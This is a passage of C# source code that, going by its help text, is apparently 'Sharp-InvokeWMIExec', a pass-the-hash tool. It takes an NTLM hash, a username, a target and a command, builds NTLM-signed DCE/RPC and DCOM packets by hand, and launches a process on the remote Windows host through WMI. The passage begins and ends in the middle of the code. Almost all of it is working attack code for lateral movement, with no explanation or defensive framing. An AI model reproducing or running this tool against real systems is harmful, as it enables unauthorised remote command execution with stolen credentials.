0x62, 0x6a, 0x65, 0x63, 0x74, 0x3a, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70 });
                                                        stub_data = CombineByteArray(stub_data, new byte[501]);
                                                        stub_data = CombineByteArray(stub_data, command_length);
                                                        stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01 });
                                                        stub_data = CombineByteArray(stub_data, command_length2);
                                                        stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x80, 0x00, 0x5f, 0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45, 0x52, 0x53, 0x00, 0x00 });
                                                        stub_data = CombineByteArray(stub_data, command_bytes);
                                                        stub_data = CombineByteArray(stub_data, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                                                        if (stub_data.Length < request_split_index)
                                                        {
                                                            request_flags = new byte[] { 0x83 };
                                                            WMI_client_stage_next = "Result";
                                                        }
                                                        else
                                                        {
                                                            request_split = true;
                                                            double request_split_stage_final = Math.Ceiling((double)stub_data.Length / request_split_index);
                                                            if (request_split_stage < 2)
                                                            {
                                                                request_length = stub_data.Length;
                                                                stub_data = getByteRange(stub_data, 0, request_split_index - 1);
                                                                request_split_stage = 2;
                                                                sequence_number_counter = 10;
                                                                request_flags = new byte[] { 0x81 };
                                                                request_split_index_tracker = request_split_index;
                                                                WMI_client_stage_next = "Request";
                                                            }
                                                            else if (request_split_stage == request_split_stage_final)
                                                            {
                                                                request_split = false;
                                                                sequence_number = BitConverter.GetBytes(sequence_number_counter);
                                                                request_split_stage = 0;
                                                                stub_data = getByteRange(stub_data, request_split_index_tracker, stub_data.Length);
                                                                request_flags = new byte[] { 0x82 };
                                                                WMI_client_stage_next = "Result";
                                                            }
                                                            else
                                                            {
                                                                request_length = stub_data.Length - request_split_index_tracker;
                                                                stub_data = getByteRange(stub_data, request_split_index_tracker, request_split_index_tracker + request_split_index - 1);
                                                                request_split_index_tracker += request_split_index;
                                                                request_split_stage++;
                                                                sequence_number = BitConverter.GetBytes(sequence_number_counter);
                                                                sequence_number_counter++;
                                                                request_flags = new byte[] { 0x80 };
                                                                WMI_client_stage_next = "Request";
                                                            }
                                                        }


                                                    }

                                                }
                                                break;



                                        }

                                        packet_RPC = GetPacketRPCRequest(request_flags, stub_data.Length, 16, request_auth_padding, request_call_ID, request_context_ID, request_opnum, request_UUID);

                                        if (request_split)
                                        {
                                            packet_RPC["RPCRequest_AllocHint"] = BitConverter.GetBytes(request_length);
                                        }

                                        packet_NTLMSSP_verifier = GetPacketNTLMSSPVerifier(request_auth_padding, new byte[] { 0x04 }, sequence_number);
                                        RPC = ConvertFromPacketOrderedDictionary(packet_RPC);
                                        NTLMSSP_verifier = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                                        RPC_Sign = CombineByteArray(sequence_number, RPC);
                                        RPC_Sign = CombineByteArray(RPC_Sign, stub_data);
                                        RPC_Sign = CombineByteArray(RPC_Sign, getByteRange(NTLMSSP_verifier, 0, request_auth_padding + 7));
                                        RPC_signature = HMAC_MD5.ComputeHash(RPC_Sign);
                                        RPC_signature = getByteRange(RPC_signature, 0, 7);
                                        packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = RPC_signature;
                                        NTLMSSP_verifier = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier);
                                        WMI_client_send = CombineByteArray(RPC, stub_data);
                                        WMI_client_send = CombineByteArray(WMI_client_send, NTLMSSP_verifier);
                                        WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                                        WMI_client_random_port_stream.Flush();

                                        if (!request_split)
                                        {
                                            WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                        }

                                        while (WMI_client_random_port_stream.DataAvailable)
                                        {
                                            WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                            Thread.Sleep(10);
                                        }
                                        WMI_client_stage = WMI_client_stage_next;

                                    }
                                    break;
                                case "Result":
                                    {
                                        while (WMI_client_random_port_stream.DataAvailable)
                                        {
                                            WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                                            Thread.Sleep(10);
                                        }

                                        if(WMI_client_receive[1145] != 9)
                                        {
                                            int target_process_ID = DataLength2(1141, WMI_client_receive);
                                            Console.WriteLine("Command executed with process ID {0} on {1}", target_process_ID, target_long);
                                        }
                                        else
                                        {
                                            Console.WriteLine("Process did not start, check your command");
                                        }

                                        WMI_client_stage = "exit";
                                    }
                                    break;

                            }
                            Thread.Sleep(10);
                        }
                        WMI_client_random_port.Close();
                        WMI_client_random_port_stream.Close();
                    }

                }
                WMI_client.Close();
                WMI_client_stream.Close();

                Console.ReadLine();
            }
        }
        
        //Begin Helper Functions.
        public static void displayHelp()
        {
            Console.WriteLine("Usage: Sharp-InvokeWMIExec.exe -h=\"hash\" -u=\"test\\username\" -t=\"target\" -c=\"command\" ");
        }
        public static byte[] getByteRange(byte[] array, int start, int end)
        {
            var newArray = array.Skip(start).Take(end - start + 1).ToArray();
            return newArray;
        }
        static private byte[] CombineByteArray(byte[] a, byte[] b)
        {
            byte[] c = new byte[a.Length + b.Length];
            Buffer.BlockCopy(a, 0, c, 0, a.Length);
            Buffer.BlockCopy(b, 0, c, a.Length, b.Length);
            return c;
        }
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        private static byte[] ConvertFromPacketOrderedDictionary(OrderedDictionary packet_ordered_dictionary)
        {
            List<byte[]> byte_list = new List<byte[]>();
            foreach (DictionaryEntry de in packet_ordered_dictionary)
            {
                byte_list.Add(de.Value as byte[]);
            }

            var flattenedList = byte_list.SelectMany(bytes => bytes);
            byte[] byte_Array = flattenedList.ToArray();

            return byte_Array;
        }
        private static OrderedDictionary GetPacketRPCBind(int packet_call_ID, byte[] packet_max_frag, byte[] packet_num_ctx_items, byte[] packet_context_ID, byte[] packet_UUID, byte[] packet_UUID_version)
        {

            byte[] packet_call_ID_bytes = BitConverter.GetBytes(packet_call_ID);

            OrderedDictionary packet_RPCBind = new OrderedDictionary();
            packet_RPCBind.Add("RPCBind_Version", new byte[] { 0x05 });
            packet_RPCBind.Add("RPCBind_VersionMinor", new byte[] { 0x00 });
            packet_RPCBind.Add("RPCBind_PacketType", new byte[] { 0x0b });
            packet_RPCBind.Add("RPCBind_PacketFlags", new byte[] { 0x03 });
            packet_RPCBind.Add("RPCBind_DataRepresentation", new byte[] { 0x10, 0x00, 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_FragLength", new byte[] { 0x48, 0x00 });
            packet_RPCBind.Add("RPCBind_AuthLength", new byte[] { 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_CallID", packet_call_ID_bytes);
            packet_RPCBind.Add("RPCBind_MaxXmitFrag", new byte[] { 0xb8, 0x10 });
            packet_RPCBind.Add("RPCBind_MaxRecvFrag", new byte[] { 0xb8, 0x10 });
            packet_RPCBind.Add("RPCBind_AssocGroup", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_NumCtxItems", packet_num_ctx_items);
            packet_RPCBind.Add("RPCBind_Unknown", new byte[] { 0x00, 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_ContextID", packet_context_ID);
            packet_RPCBind.Add("RPCBind_NumTransItems", new byte[] { 0x01 });
            packet_RPCBind.Add("RPCBind_Unknown2", new byte[] { 0x00 });
            packet_RPCBind.Add("RPCBind_Interface", packet_UUID);
            packet_RPCBind.Add("RPCBind_InterfaceVer", packet_UUID_version);
            packet_RPCBind.Add("RPCBind_InterfaceVerMinor", new byte[] { 0x00, 0x00 });
            packet_RPCBind.Add("RPCBind_TransferSyntax", new byte[] { 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60 });
            packet_RPCBind.Add("RPCBind_TransferSyntaxVer", new byte[] { 0x02, 0x00, 0x00, 0x00 });


            if (packet_num_ctx_items[0] == 2)
            {
                packet_RPCBind.Add("RPCBind_ContextID2", new byte[] { 0x01, 0x00 });
                packet_RPCBind.Add("RPCBind_NumTransItems2", new byte[] { 0x01 });
                packet_RPCBind.Add("RPCBind_Unknown3", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_Interface2", new byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a });
                packet_RPCBind.Add("RPCBind_InterfaceVer2", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_InterfaceVerMinor2", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntax2", new byte[] { 0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntaxVer2", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            }
            else if (packet_num_ctx_items[0] == 3)
            {
                packet_RPCBind.Add("RPCBind_ContextID2", new byte[] { 0x01, 0x00 });
                packet_RPCBind.Add("RPCBind_NumTransItems2", new byte[] { 0x01 });
                packet_RPCBind.Add("RPCBind_Unknown3", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_Interface2", new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
                packet_RPCBind.Add("RPCBind_InterfaceVer2", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_InterfaceVerMinor2", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntax2", new byte[] { 0x33, 0x05, 0x71, 0x71, 0xba, 0xbe, 0x37, 0x49, 0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36 });
                packet_RPCBind.Add("RPCBind_TransferSyntaxVer2", new byte[] { 0x01, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_ContextID3", new byte[] { 0x02, 0x00 });
                packet_RPCBind.Add("RPCBind_NumTransItems3", new byte[] { 0x01 });
                packet_RPCBind.Add("RPCBind_Unknown4", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_Interface3", new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
                packet_RPCBind.Add("RPCBind_InterfaceVer3", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_InterfaceVerMinor3", new byte[] { 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntax3", new byte[] { 0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_TransferSyntaxVer3", new byte[] { 0x01, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_AuthType", new byte[] { 0x0a });
                packet_RPCBind.Add("RPCBind_AuthLevel", new byte[] { 0x04 });
                packet_RPCBind.Add("RPCBind_AuthPadLength", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_AuthReserved", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_ContextID4", new byte[] { 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_Identifier", new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00 });
                packet_RPCBind.Add("RPCBind_MessageType", new byte[] { 0x01, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_NegotiateFlags", new byte[] { 0x97, 0x82, 0x08, 0xe2 });
                packet_RPCBind.Add("RPCBind_CallingWorkstationDomain", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_CallingWorkstationName", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_OSVersion", new byte[] { 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f });
            }

            if (packet_call_ID == 3)
            {
                packet_RPCBind.Add("RPCBind_AuthType", new byte[] { 0x0a });
                packet_RPCBind.Add("RPCBind_AuthLevel", new byte[] { 0x02 });
                packet_RPCBind.Add("RPCBind_AuthPadLength", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_AuthReserved", new byte[] { 0x00 });
                packet_RPCBind.Add("RPCBind_ContextID3", new byte[] { 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_Identifier", new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00 });
                packet_RPCBind.Add("RPCBind_MessageType", new byte[] { 0x01, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_NegotiateFlags", new byte[] { 0x97, 0x82, 0x08, 0xe2 });
                packet_RPCBind.Add("RPCBind_CallingWorkstationDomain", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_CallingWorkstationName", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                packet_RPCBind.Add("RPCBind_OSVersion", new byte[] { 0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f });
            }

            return packet_RPCBind;
        }
        private static OrderedDictionary GetPacketRPCAuth3(byte[] packet_NTLMSSP)
        {
            //4 extra bytes?
            byte[] packet_NTLMSSP_length = BitConverter.GetBytes(packet_NTLMSSP.Length);
            packet_NTLMSSP_length = new byte[] { packet_NTLMSSP_length[0], packet_NTLMSSP_length[1] };

            byte[] packet_RPC_length = BitConverter.GetBytes(packet_NTLMSSP.Length+28);
            packet_RPC_length = new byte[] { packet_RPC_length[0], packet_RPC_length[1] };


            OrderedDictionary packet_RPCAuth3 = new OrderedDictionary();
            packet_RPCAuth3.Add("RPCAUTH3_Version", new byte[] {0x05 });
            packet_RPCAuth3.Add("RPCAUTH3_VersionMinor", new byte[] {0x00 });
            packet_RPCAuth3.Add("RPCAUTH3_PacketType", new byte[] { 0x10});
            packet_RPCAuth3.Add("RPCAUTH3_PacketFlags", new byte[] { 0x03});
            packet_RPCAuth3.Add("RPCAUTH3_DataRepresentation", new byte[] {0x10,0x00,0x00,0x00 });
            packet_RPCAuth3.Add("RPCAUTH3_FragLength", packet_RPC_length);
            packet_RPCAuth3.Add("RPCAUTH3_AuthLength", packet_NTLMSSP_length);
            packet_RPCAuth3.Add("RPCAUTH3_CallID", new byte[] { 0x03,0x00,0x00,0x00});
            packet_RPCAuth3.Add("RPCAUTH3_MaxXmitFrag", new byte[] { 0xd0,0x16});
            packet_RPCAuth3.Add("RPCAUTH3_MaxRecvFrag", new byte[] { 0xd0,0x16});
            packet_RPCAuth3.Add("RPCAUTH3_AuthType", new byte[] { 0x0a});
            packet_RPCAuth3.Add("RPCAUTH3_AuthLevel", new byte[] { 0x02});
            packet_RPCAuth3.Add("RPCAUTH3_AuthPadLength", new byte[] { 0x00});
            packet_RPCAuth3.Add("RPCAUTH3_AuthReserved", new byte[] { 0x00});
            packet_RPCAuth3.Add("RPCAUTH3_ContextID", new byte[] { 0x00,0x00,0x00,0x00});
            packet_RPCAuth3.Add("RPCAUTH3_NTLMSSP", packet_NTLMSSP);

            return packet_RPCAuth3;
        }
        private static OrderedDictionary GetPacketRPCRequest(byte[] packet_flags, int packet_service_length, int packet_auth_length, int packet_auth_padding, byte[] packet_call_ID, byte[] packet_context_ID, byte[] packet_opnum, byte[] packet_data)
        {
            int packet_full_auth_length;
            byte[] packet_write_length;
            byte[] packet_alloc_hint;
            if (packet_auth_length > 0)
            {
                packet_full_auth_length = packet_auth_length + packet_auth_padding + 8;
            }
            else
            {
                packet_full_auth_length = 0;
            }


            if (packet_data != null)
            {
                packet_write_length = BitConverter.GetBytes(packet_service_length + 24 + packet_full_auth_length + packet_data.Length);
                packet_alloc_hint = BitConverter.GetBytes(packet_service_length + packet_data.Length);
            }
            else
            {
                //Doing this because sometimes he calls it with 7 params instead of 8, which Powershell outputs the length to 0.
                packet_write_length = BitConverter.GetBytes(packet_service_length + 24 + packet_full_auth_length);
                packet_alloc_hint = BitConverter.GetBytes(packet_service_length);

            }

            byte[] packet_frag_length = { packet_write_length[0], packet_write_length[1] };
            byte[] packet_auth_length2 = BitConverter.GetBytes(packet_auth_length);
            byte[] packet_auth_length3 = { packet_auth_length2[0], packet_auth_length2[1] };

            OrderedDictionary packet_RPCRequest = new OrderedDictionary();
            packet_RPCRequest.Add("RPCRequest_Version", new byte[] { 0x05 });
            packet_RPCRequest.Add("RPCRequest_VersionMinor", new byte[] { 0x00 });
            packet_RPCRequest.Add("RPCRequest_PacketType", new byte[] { 0x00 });
            packet_RPCRequest.Add("RPCRequest_PacketFlags", packet_flags);
            packet_RPCRequest.Add("RPCRequest_DataRepresentation", new byte[] { 0x10, 0x00, 0x00, 0x00 });
            packet_RPCRequest.Add("RPCRequest_FragLength", packet_frag_length);
            packet_RPCRequest.Add("RPCRequest_AuthLength", packet_auth_length3);
            packet_RPCRequest.Add("RPCRequest_CallID", packet_call_ID);
            packet_RPCRequest.Add("RPCRequest_AllocHint", packet_alloc_hint);
            packet_RPCRequest.Add("RPCRequest_ContextID", packet_context_ID);
            packet_RPCRequest.Add("RPCRequest_Opnum", packet_opnum);

            if (packet_data != null && packet_data.Length > 0)
            {
                packet_RPCRequest.Add("RPCRequest_Data", packet_data);
            }

            return packet_RPCRequest;

        }
        private static OrderedDictionary GetPacketRPCAlterContext(byte[] packet_assoc_group, byte[] packet_call_ID, byte[] packet_context_ID, byte[] packet_interface_UUID)
        {
            OrderedDictionary packet_RPCAlterContext = new OrderedDictionary();
            packet_RPCAlterContext.Add("RPCAlterContext_Version", new byte[] { 0x05});
            packet_RPCAlterContext.Add("RPCAlterContext_VersionMinor", new byte[] {0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_PacketType", new byte[] {0x0e});
            packet_RPCAlterContext.Add("RPCAlterContext_PacketFlags", new byte[] { 0x03});
            packet_RPCAlterContext.Add("RPCAlterContext_DataRepresentation", new byte[] {0x10,0x00,0x00,0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_FragLength", new byte[] {0x48,0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_AuthLength", new byte[] {0x00,0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_CallID", packet_call_ID);
            packet_RPCAlterContext.Add("RPCAlterContext_MaxXmitFrag", new byte[] {0xd0,0x16 });
            packet_RPCAlterContext.Add("RPCAlterContext_MaxRecvFrag", new byte[] {0xd0,0x16 });
            packet_RPCAlterContext.Add("RPCAlterContext_AssocGroup", packet_assoc_group);
            packet_RPCAlterContext.Add("RPCAlterContext_NumCtxItems", new byte[] {0x01 });
            packet_RPCAlterContext.Add("RPCAlterContext_Unknown", new byte[] {0x00,0x00,0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_ContextID", packet_context_ID);
            packet_RPCAlterContext.Add("RPCAlterContext_NumTransItems", new byte[] {0x01 });
            packet_RPCAlterContext.Add("RPCAlterContext_Unknown2", new byte[] {0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_Interface", packet_interface_UUID);
            packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVer", new byte[] {0x00,0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_InterfaceVerMinor", new byte[] {0x00,0x00 });
            packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntax", new byte[] {0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60 });
            packet_RPCAlterContext.Add("RPCAlterContext_TransferSyntaxVer", new byte[] { 0x02,0x00,0x00,0x00});

            packet_RPCAlterContext.Add("", new byte[] { });

            return packet_RPCAlterContext;
        }
        private static OrderedDictionary GetPacketNTLMSSPVerifier(int packet_auth_padding, byte[] packet_auth_level, byte[] packet_sequence_number)
        {
            OrderedDictionary packet_NTLMSSPVerifier = new OrderedDictionary();
            byte[] packet_auth_pad_length = null;

            if(packet_auth_padding == 4)
            {
                packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding", new byte[] {0x00,0x00,0x00,0x00});
                packet_auth_pad_length = new byte[] { 0x04 };
            }
            else if (packet_auth_padding == 8)
            {
                packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding", new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 });
                packet_auth_pad_length = new byte[] { 0x08 };
            }
            else if (packet_auth_padding == 12)
            {
                packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadding", new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 });
                packet_auth_pad_length = new byte[] { 0x0c };
            }
            else
            {
                packet_auth_pad_length = new byte[] { 0x00 };
            }

            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthType", new byte[] {0x0a });
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthLevel",packet_auth_level);
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthPadLen", packet_auth_pad_length);
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_AuthReserved", new byte[] { 0x00});
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_ContextID", new byte[] {0x00,0x00,0x00,0x00 });
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierVersionNumber", new byte[] {0x01,0x00,0x00,0x00 });
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierChecksum", new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 });
            packet_NTLMSSPVerifier.Add("NTLMSSPVerifier_NTLMSSPVerifierSequenceNumber", packet_sequence_number);

            return packet_NTLMSSPVerifier;
        }
        private static OrderedDictionary GetPacketDCOMRemQueryInterface(byte[] packet_causality_ID,byte[] packet_IPID, byte[] packet_IID)
        {
            OrderedDictionary packet_DCOMRemQueryInterface = new OrderedDictionary();

            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMajor", new byte[] { 0x05,0x00});
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_VersionMinor", new byte[] { 0x07,0x00});
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Flags", new byte[] { 0x00,0x00,0x00,0x00});
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved", new byte[] { 0x00,0x00,0x00,0x00});
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_CausalityID", packet_causality_ID);
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Reserved2", new byte[] {0x00,0x00,0x00,0x00 });
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IPID", packet_IPID);
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Refs", new byte[] { 0x05,0x00,0x00,0x00});
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_IIDs", new byte[] { 0x01,0x00});
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_Unknown", new byte[] { 0x00,0x00,0x01,0x00,0x00,0x00});
            packet_DCOMRemQueryInterface.Add("DCOMRemQueryInterface_", packet_IID);

            return packet_DCOMRemQueryInterface;
        }
        private static OrderedDictionary GetPacketDCOMRemRelease(byte[] packet_causality_ID, byte[] packet_IPID, byte[] packet_IPID2)
        {
            OrderedDictionary packet_DCOMRemRelease = new OrderedDictionary();
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_VersionMajor", new byte[] {0x05,0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_VersionMinor", new byte[] {0x07,0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_Flags", new byte[] {0x00,0x00,0x00,0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_Reserved", new byte[] {0x00,0x00,0x00,0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_CausalityID", packet_causality_ID);
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_Reserved2", new byte[] {0x00,0x00,0x00,0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_Unknown", new byte[] { 0x02,0x00,0x00,0x00});
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_InterfaceRefs", new byte[] {0x02,0x00,0x00,0x00 });
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_IPID", packet_IPID);
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_PublicRefs", new byte[] { 0x05,0x00,0x00,0x00});
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_PrivateRefs", new byte[] { 0x00,0x00,0x00,0x00});
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_packet_IPID2", packet_IPID2);
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_PublicRefs2", new byte[] { 0x05,0x00,0x00,0x00});
            packet_DCOMRemRelease.Add("packet_DCOMRemRelease_PrivateRefs2", new byte[] { 0x00,0x00,0x00,0x00});
            return packet_DCOMRemRelease;
        }
        private static OrderedDictionary GetPacketDCOMRemoteCreateInstance(byte[] packet_causality_ID, string packet_target)
        {

            byte[] packet_target_unicode = Encoding.Unicode.GetBytes(packet_target);
            byte[] packet_target_length = BitConverter.GetBytes(packet_target.Length + 1);
            double bytesize = (Math.Truncate((double)packet_target_unicode.Length / 8 + 1) * 8) - packet_target_unicode.Length;
            byte[] nulls = new byte[Convert.ToInt32(bytesize)];
            packet_target_unicode = CombineByteArray(packet_target_unicode,nulls);
            byte[] packet_cntdata = BitConverter.GetBytes(packet_target_unicode.Length + 720);
            byte[] packet_size = BitConverter.GetBytes(packet_target_unicode.Length + 680);
            byte[] packet_total_size = BitConverter.GetBytes(packet_target_unicode.Length + 664);
            byte[] packet_private_header = CombineByteArray((BitConverter.GetBytes(packet_target_unicode.Length + 40)) , new byte[] { 0x00, 0x00, 0x00, 0x00 });
            byte[] packet_property_data_size = BitConverter.GetBytes(packet_target_unicode.Length + 56);

            OrderedDictionary packet_DCOMRemoteCreateInstance = new OrderedDictionary();
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMajor", new byte[] { 0x05, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMVersionMinor", new byte[] { 0x07, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMFlags", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_DCOMCausalityID", packet_causality_ID);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown2", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown3", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_Unknown4", packet_cntdata);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCntData", packet_cntdata);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFSignature", new byte[] { 0x4d, 0x45, 0x4f, 0x57 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFFlags", new byte[] { 0x04, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesOBJREFIID", new byte[] { 0xa2, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
